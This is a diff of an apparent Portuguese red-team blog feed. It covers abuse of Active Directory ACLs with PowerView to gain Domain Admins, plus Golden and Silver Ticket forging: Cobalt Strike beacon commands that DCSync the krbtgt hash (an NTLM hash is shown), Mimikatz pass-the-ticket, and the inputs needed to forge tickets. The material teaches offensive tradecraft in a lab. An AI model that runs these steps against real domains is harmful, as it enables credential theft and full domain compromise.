-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectSID&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;S-1-5-21-3380101520-2231475763-736739948-512&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<p>O problema de segurança ocorre quando o hash da conta KRBTGT é comprometido. Nesse momento, o atacante pode forjar TGT’s, assinando-os com o hash obtido e se utilizar de qualquer conta presente no domínio (forjada) empoderando-se dos privilégios concedidos as mesmas ou adicionando novos privilégios alterando a estrutura do ticket.</p>
 
-&lt;p&gt;&lt;a href=&quot;https://github.com/BloodHoundAD&quot;&gt;BloodHound&lt;/a&gt; attack path, partindo do node HNR\acode, usuário pertencente ao grupo HNR\hnr_admins, com o objetivo de obter privilégios do grupo Domain Admins.&lt;/p&gt;
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/ges/gt.png" alt="" /></p>
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/sample/dacl/bh5.png&quot; alt=&quot;upload-image&quot; /&gt;&lt;/p&gt;
+<ul>
+  <li>Forging Golden Tickets</li>
+</ul>
 
-&lt;p&gt;Abaixo pode-se notar que foi verificado que o usuário HNR\acode não fazia parte dos membros do grupo Domain Admins, somente do grupo hnr_admins. O powerview possui o cmdlet Set-DomainObjectOwner, utilizado para definir o usuário HNR\acode como Owner do grupo Domain Admins. Após concluir a escrita do owner para usuário HNR\acode, foi criada uma ACE (Add-DomainObjectAcl) concedendo todos os privilégios ao usuário (-Rights “ALL”). Após todos os privilégios serem concedidos, o usuário HNR\acode foi inserido como membro do grupo Domain Admins (Add-DomainGroupMember).&lt;/p&gt;
+<p>O ataque em questão foi apresentado por Benjamin Delpy, mais conhecido como <a href="https://twitter.com/gentilkiwi">@gentilkiwi</a>. Ele é o criador das famosas ferramentas <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> e <a href="https://github.com/gentilkiwi/kekeo">Kekeo</a>, amplamente utilizadas por todos no mundo offsec.</p>
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/sample/dacl/fun5.png&quot; alt=&quot;upload-image&quot; /&gt;&lt;/p&gt;
+<p>Para efeitos de demonstração, foi utilizado a ferramenta Mimikatz para a execução do ataque. Existem outras ferramentas que podem auxiliar na tarefa, como o projeto <a href="https://github.com/GhostPack/Rubeus">Rubeus</a>, presente na toolkit <a href="https://github.com/GhostPack/">GhostPack</a>, projeto da SpecterOps criado para portar a maioria das ferramentas que antes eram escritas em Powershell para C#. Após as <a href="https://devblogs.microsoft.com/powershell/powershell-the-blue-team/">melhorias de seguranças aplicadas a partir da versão 5 do Powershell</a>, muitos ataques começaram a ser bloqueados, causando desconforto para os analistas. Mas isso é história para outro blog post.</p>
 
-&lt;h2 id=&quot;allextendedrights&quot;&gt;AllExtendedRights&lt;/h2&gt;
+<p>Para que o Mimikatz possa executar o ataque, são necessários alguns bits de informação:</p>
 
-&lt;p&gt;Poderes sobre todas as propriedades &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/adschema/extended-rights&quot;&gt;Extended Righs&lt;/a&gt; de um objeto.&lt;/p&gt;
+<p>User: Usuário no qual o atacante deseja obter iguais privilégios.</p>
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Users\tuxtrack.HNR\Desktop&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Get-ObjectAcl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ResolveGUIDs&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;objectdn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;CN=tuxtrack,OU=hnr_blog,DC=hnr,DC=local&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InheritedObjectType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectDN&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tuxtrack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;OU&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hnr_blog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hnr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IdentityReference&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HNR\pupilo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IsInherited&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ActiveDirectoryRights&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ReadProperty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WriteProperty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ExtendedRight&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PropagationFlags&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectFlags&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InheritanceFlags&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ContainerInherit&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InheritanceType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AccessControlType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Allow&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectSID&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;S-1-5-21-3380101520-2231475763-736739948-1105&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<p>Domain Name: FQDN <a href="https://en.wikipedia.org/wiki/Fully_qualified_domain_name">(Fully Qualified Domain Name)</a></p>
 
-&lt;p&gt;&lt;a href=&quot;https://github.com/BloodHoundAD&quot;&gt;BloodHound&lt;/a&gt; attack path, partindo do node HNR\pupilo, usuário com AllExtendedRights sobre o usuário HNR\tuxtrack.&lt;/p&gt;
+<p>Domain SID: Domain SID</p>
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/sample/dacl/bh6.png&quot; alt=&quot;upload-image&quot; /&gt;&lt;/p&gt;
+<p>KRBTGT NTLM Hash: Hash extraído do usuário KRBTGT.</p>
 
-&lt;p&gt;Extended Rights aplicáveis a usuários&lt;/p&gt;
+<p>Como mencionado, o atacante poderá alterar a estrutura do ticket, adicionando outras informações utilizando os parâmetros “/groups:” e “id”, para fornecer informções sobre grupos (Grupos com poderes administrativos: 512,513,518,519,520 ) e RID’s.</p>
 
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Extended Right&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Description&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Change Password {ab721a53-1e2f-11d0-9819-00aa0040529b}&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Enables you to change the password on a user account. You must know the user’s current password in order to provide them with a new password.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Reset Password {00299570-246d-11d0-a768-00aa006e0529}&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Enables you to reset the password on a user account. You do not need to know the user’s current password in order to provide them with a new password.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Receive As {ab721a56-1e2f-11d0-9819-00aa0040529b}&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Exchange right that enables you to receive mail as a given mailbox.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Send As {ab721a54-1e2f-11d0-9819-00aa0040529b}&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Exchange right that enables you to send mail as the mailbox.&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
+<p>O processo de extração do hash da conta KRBTGT pode ser realizado de diversas formas, para mais informações, recomendo a leitura do blog post <a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/">Dumping Domain Password Hashes</a>.</p>
 
-&lt;p&gt;No cenário abaixo, o usuário HNR\pupilo, possui plenos privilégios para alterar a senha do usuário HNR\tuxtrack. Após alterá-la, o usuário pode executar o cmd.exe através do comando &lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v%3Dws.11)&quot;&gt;runas&lt;/a&gt; com o usuário HNR\tuxtrack.&lt;/p&gt;
+<p>Processo de obtenção do hash através de <a href="https://adsecurity.org/?p=1729">DCSYNC Attack</a>.</p>
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/sample/dacl/fun6.png&quot; alt=&quot;upload-image&quot; /&gt;&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;Como apresentado, privilégios podem ser abusados em diversos caminhos, explorando a necessidade de delegá-los dentro de uma infraestrutura corporativa para atender as mais adversas necessidades.&lt;/p&gt;
-
-&lt;p&gt;Fico a disposição para sanar quaisquer dúvidas, até o próximo!&lt;/p&gt;
-
-&lt;p&gt;Referências:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf&quot;&gt;An ACE Up The Sleeve&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2&quot;&gt;Active Directory Rights Enum&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/tn-archive/ff405676(v=msdn.10)&quot;&gt;Extended Rights Reference&lt;/a&gt;&lt;/p&gt;</content><author><name>tuxtrack</name></author><category term="ACTIVE DIRECTORY" /><category term="REDTEAM" /><category term="WINDOWS" /><category term="ACL" /><summary type="html">O Microsoft Active Directory possui grupos pré-definidos para delegar permissões a usuários e grupos, porém nem sempre é plausível delegar tantos poderes quando se precisa somente de poucos privilégios. Administradores de sistemas podem delegar permissões para usuários/computadores/grupos do domínio sem que os mesmos façam parte de um grupo privilegiado, assim, usuários poderão executar tarefas como, adicionar um usuário/grupo a um determinado grupo, alterar a senha de usuários e modificar propriedades inerentes ao objeto em questão através de ACL’s.</summary></entry><entry><title type="html">Golden &amp;amp; Silver</title><link href="http://localhost:4000/2020/03/02/g&s.html" rel="alternate" type="text/html" title="Golden &amp;amp; Silver" /><published>2020-03-02T09:00:00-03:00</published><updated>2020-03-02T09:00:00-03:00</updated><id>http://localhost:4000/2020/03/02/g&amp;s</id><content type="html" xml:base="http://localhost:4000/2020/03/02/g&amp;s.html">&lt;p&gt;Como mostrado no &lt;a href=&quot;https://tuxtrack.github.io/posts/kerberos101/&quot;&gt;post anterior&lt;/a&gt;, em meio ao processo de autenticação de um usuário/computador em um ambiente Microsoft Active Directory utilizando o protocolo Kerberos, uma troca de informações ocorre para validar a conta em questão.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/ges/kerb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ao ocorrer a solicitação de acesso a algum recurso existente no domínio utilizando o protocolo Kerberos, automaticamente será solicitado ao KDC um ticket do tipo TGT (Ticket-Granting Ticket). Caso a conta seja válida, o KDC retornará o ticket assinado/criptografado pela conta KRBTGT.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;KRBTGT is also the security principal name used by the KDC for a Windows Server domain, as specified by RFC 4120. The KRBTGT account is the entity for the KRBTGT security principal, and it is created automatically when a new domain is created. &lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn745899(v=ws.11)&quot;&gt;MS Docs&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/ges/krbtgt.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;golden-tickets&quot;&gt;Golden Tickets&lt;/h3&gt;
-
-&lt;p&gt;O problema de segurança ocorre quando o hash da conta KRBTGT é comprometido. Nesse momento, o atacante pode forjar TGT’s, assinando-os com o hash obtido e se utilizar de qualquer conta presente no domínio (forjada) empoderando-se dos privilégios concedidos as mesmas ou adicionando novos privilégios alterando a estrutura do ticket.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/ges/gt.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Forging Golden Tickets&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;O ataque em questão foi apresentado por Benjamin Delpy, mais conhecido como &lt;a href=&quot;https://twitter.com/gentilkiwi&quot;&gt;@gentilkiwi&lt;/a&gt;. Ele é o criador das famosas ferramentas &lt;a href=&quot;https://github.com/gentilkiwi/mimikatz&quot;&gt;Mimikatz&lt;/a&gt; e &lt;a href=&quot;https://github.com/gentilkiwi/kekeo&quot;&gt;Kekeo&lt;/a&gt;, amplamente utilizadas por todos no mundo offsec.&lt;/p&gt;
-
-&lt;p&gt;Para efeitos de demonstração, foi utilizado a ferramenta Mimikatz para a execução do ataque. Existem outras ferramentas que podem auxiliar na tarefa, como o projeto &lt;a href=&quot;https://github.com/GhostPack/Rubeus&quot;&gt;Rubeus&lt;/a&gt;, presente na toolkit &lt;a href=&quot;https://github.com/GhostPack/&quot;&gt;GhostPack&lt;/a&gt;, projeto da SpecterOps criado para portar a maioria das ferramentas que antes eram escritas em Powershell para C#. Após as &lt;a href=&quot;https://devblogs.microsoft.com/powershell/powershell-the-blue-team/&quot;&gt;melhorias de seguranças aplicadas a partir da versão 5 do Powershell&lt;/a&gt;, muitos ataques começaram a ser bloqueados, causando desconforto para os analistas. Mas isso é história para outro blog post.&lt;/p&gt;
-
-&lt;p&gt;Para que o Mimikatz possa executar o ataque, são necessários alguns bits de informação:&lt;/p&gt;
-
-&lt;p&gt;User: Usuário no qual o atacante deseja obter iguais privilégios.&lt;/p&gt;
-
-&lt;p&gt;Domain Name: FQDN &lt;a href=&quot;https://en.wikipedia.org/wiki/Fully_qualified_domain_name&quot;&gt;(Fully Qualified Domain Name)&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Domain SID: Domain SID&lt;/p&gt;
-
-&lt;p&gt;KRBTGT NTLM Hash: Hash extraído do usuário KRBTGT.&lt;/p&gt;
-
-&lt;p&gt;Como mencionado, o atacante poderá alterar a estrutura do ticket, adicionando outras informações utilizando os parâmetros “/groups:” e “id”, para fornecer informções sobre grupos (Grupos com poderes administrativos: 512,513,518,519,520 ) e RID’s.&lt;/p&gt;
-
-&lt;p&gt;O processo de extração do hash da conta KRBTGT pode ser realizado de diversas formas, para mais informações, recomendo a leitura do blog post &lt;a href=&quot;https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/&quot;&gt;Dumping Domain Password Hashes&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;Processo de obtenção do hash através de &lt;a href=&quot;https://adsecurity.org/?p=1729&quot;&gt;DCSYNC Attack&lt;/a&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;beacon&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;dcsync hnr.local krbtgt
-&lt;span class=&quot;go&quot;&gt;[*] Tasked beacon to run mimikatz's @lsadump::dcsync /domain:hnr.local /user:krbtgt command
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">beacon&gt;</span><span class="w"> </span>dcsync hnr.local krbtgt
+<span class="go">[*] Tasked beacon to run mimikatz's @lsadump::dcsync /domain:hnr.local /user:krbtgt command
 [+] host called home, sent: 746570 bytes
 [+] received output:
 [DC] 'hnr.local' will be the domain
@@ -379,52 +314,52 @@ Object Security ID   : S-1-5-21-45967290-1955130809-1078885739-502
 Object Relative ID   : 502
 Credentials:
   Hash NTLM: 86db69b9000654a8a4d4b6abe6ed1553
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Com as informações necessárias em mãos, a execução do ataque pode ser concluída.&lt;/p&gt;
+</span></code></pre></div></div>
+<p>Com as informações necessárias em mãos, a execução do ataque pode ser concluída.</p>
 
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/ges/mimi.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/ges/mimi.png" alt="" /></p>
 
-&lt;p&gt;Com a execução do mimikatz, o ticket para o usuário ganderson foi forjado e submetido na sessão atual utilizando um ataque chamado Pass-The-Ticket, parametro “/ptt” (Devo criar um outro blog post mostrando como funciona o Pass-the-ticket e Over Pass the Hash).&lt;/p&gt;
+<p>Com a execução do mimikatz, o ticket para o usuário ganderson foi forjado e submetido na sessão atual utilizando um ataque chamado Pass-The-Ticket, parametro “/ptt” (Devo criar um outro blog post mostrando como funciona o Pass-the-ticket e Over Pass the Hash).</p>
 
-&lt;hr /&gt;
+<hr />
 
-&lt;h3 id=&quot;silver-tickets&quot;&gt;Silver Tickets&lt;/h3&gt;
+<h3 id="silver-tickets">Silver Tickets</h3>
 
-&lt;p&gt;Silver Tickets seguem a mesma ideia do Golden Ticket, porém, forjando um TGS (Service Ticket) em vez do TGT. Os tickets são criados utilizando a conta do computador ou conta de serviço do recurso que o atacante deseja acessar. As informações sobre o usuário, grupo e etc podem ser forjadas sem a necessidade de nenhuma troca de informação entre User Workstation e KDC.&lt;/p&gt;
+<p>Silver Tickets seguem a mesma ideia do Golden Ticket, porém, forjando um TGS (Service Ticket) em vez do TGT. Os tickets são criados utilizando a conta do computador ou conta de serviço do recurso que o atacante deseja acessar. As informações sobre o usuário, grupo e etc podem ser forjadas sem a necessidade de nenhuma troca de informação entre User Workstation e KDC.</p>
 
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/ges/st.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/ges/st.png" alt="" /></p>
 
-&lt;p&gt;Por padrão, as senhas das contas dos computadores são alteradas a cada 30 dias. Logo, o hash da conta pode ser alterado em meio ao projeto, causando perda de acesso. Para contornar o “problema”, é possível solicitar a informação sobre a máquina alvo e verificar o tempo limite até a senha ser alterada novamente.&lt;/p&gt;
+<p>Por padrão, as senhas das contas dos computadores são alteradas a cada 30 dias. Logo, o hash da conta pode ser alterado em meio ao projeto, causando perda de acesso. Para contornar o “problema”, é possível solicitar a informação sobre a máquina alvo e verificar o tempo limite até a senha ser alterada novamente.</p>
 
-&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;beacon&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;powerpick Get-NetComputer &lt;span class=&quot;nt&quot;&gt;-Name&lt;/span&gt; SQL | Select name, samaccounttype, pwdlastset
-&lt;span class=&quot;go&quot;&gt;[*] Tasked beacon to run: Get-NetComputer -Name SQL | Select name, samaccounttype, pwdlastset (unmanaged)
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">beacon&gt;</span><span class="w"> </span>powerpick Get-NetComputer <span class="nt">-Name</span> SQL | Select name, samaccounttype, pwdlastset
+<span class="go">[*] Tasked beacon to run: Get-NetComputer -Name SQL | Select name, samaccounttype, pwdlastset (unmanaged)
 [+] host called home, sent: 133715 bytes
 [+] received output:
 
 name  samaccounttype pwdlastset         
 ----  -------------- ----------         
 SQL  MACHINE_ACCOUNT 12/02/2020 14:53:05
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</span></code></pre></div></div>
 
-&lt;p&gt;Caso um usuário tente acessar um recurso no qual o mesmo não possui autorização, a negação do acesso é automaticamente efetuada. Para fins de demonstração, foi solicitado o acesso ao serviço de compartilhamento por um usuário que propositalmente não possui privilégios para tal.&lt;/p&gt;
+<p>Caso um usuário tente acessar um recurso no qual o mesmo não possui autorização, a negação do acesso é automaticamente efetuada. Para fins de demonstração, foi solicitado o acesso ao serviço de compartilhamento por um usuário que propositalmente não possui privilégios para tal.</p>
 
-&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;beacon&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;shell &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;SQL.hnr.local&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;span class=&quot;gp&quot;&gt;[*] Tasked beacon to run: dir \\SQL.hnr.local\c$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;[+] host called home, sent: 53 bytes
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">beacon&gt;</span><span class="w"> </span>shell <span class="nb">dir</span> <span class="se">\\</span>SQL.hnr.local<span class="se">\c</span><span class="err">$</span>
+<span class="gp">[*] Tasked beacon to run: dir \\SQL.hnr.local\c$</span><span class="w">
+</span><span class="go">[+] host called home, sent: 53 bytes
 [+] received output:
 Access is denied.
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</span></code></pre></div></div>
 
-&lt;p&gt;Para forjar um Silver Ticket, algumas informações adicionais são necessárias:&lt;/p&gt;
+<p>Para forjar um Silver Ticket, algumas informações adicionais são necessárias:</p>
 
-&lt;p&gt;Taget: FQDN &lt;a href=&quot;https://en.wikipedia.org/wiki/Fully_qualified_domain_name&quot;&gt;(Fully Qualified Domain Name)&lt;/a&gt;&lt;/p&gt;
+<p>Taget: FQDN <a href="https://en.wikipedia.org/wiki/Fully_qualified_domain_name">(Fully Qualified Domain Name)</a></p>
 
-&lt;p&gt;Service: Serviço no qual deseja obter acesso (PS-Remoting, WMI, Scheduled Tasks, CIFS, LDAP, WINRM…)&lt;/p&gt;
+<p>Service: Serviço no qual deseja obter acesso (PS-Remoting, WMI, Scheduled Tasks, CIFS, LDAP, WINRM…)</p>
 
-&lt;p&gt;rc4: NTLM Hash do computador/serviço, usado para assinar os tickets de serviço.&lt;/p&gt;
+<p>rc4: NTLM Hash do computador/serviço, usado para assinar os tickets de serviço.</p>
 
